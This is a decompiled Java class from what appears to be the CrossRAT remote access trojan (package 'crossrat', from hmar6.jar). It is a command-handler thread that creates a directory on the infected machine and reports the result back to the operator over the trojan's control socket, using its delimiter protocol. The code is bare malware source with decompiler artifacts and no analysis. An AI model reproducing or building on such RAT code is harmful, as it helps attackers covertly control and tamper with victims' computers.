package crossrat;

import java.io.DataOutputStream;
import java.io.File;

/* loaded from: hmar6.jar:crossrat/a.class */
final class a extends Thread {

    /* renamed from: a */
    private String f28a;

    /* renamed from: b */
    private String f29b = null;

    public a(String str) {
        this.f28a = str;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v1 */
    /* JADX WARN: Type inference failed for: r0v12 */
    /* JADX WARN: Type inference failed for: r0v13, types: [java.lang.Exception] */
    /* JADX WARN: Type inference failed for: r0v14, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v16, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v17 */
    /* JADX WARN: Type inference failed for: r0v18 */
    /* JADX WARN: Type inference failed for: r0v19 */
    /* JADX WARN: Type inference failed for: r0v2, types: [java.lang.Exception] */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        boolean z;
        ?? r0;
        File file = new File(this.f28a);
        ?? r02 = 0;
        boolean z2 = false;
        try {
            r02 = new DataOutputStream(k.k.getOutputStream());
            z2 = r02;
        } catch (Exception e) {
            r02.printStackTrace();
        }
        if (!file.exists()) {
            try {
                file.mkdir();
                z = true;
            } catch (SecurityException unused) {
                z = false;
                this.f29b = "0";
            }
            boolean z3 = z;
            r0 = z3;
            if (z3) {
                a aVar = this;
                aVar.f29b = "1";
                r0 = aVar;
            }
        } else {
            a aVar2 = this;
            aVar2.f29b = "2";
            r0 = aVar2;
        }
        try {
            r0 = z2;
            r0.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.file_created_status + k.arg_delimit + this.f29b + k.arg_delimit + "&&&");
        } catch (Exception e2) {
            r0.printStackTrace();
        }
    }
}
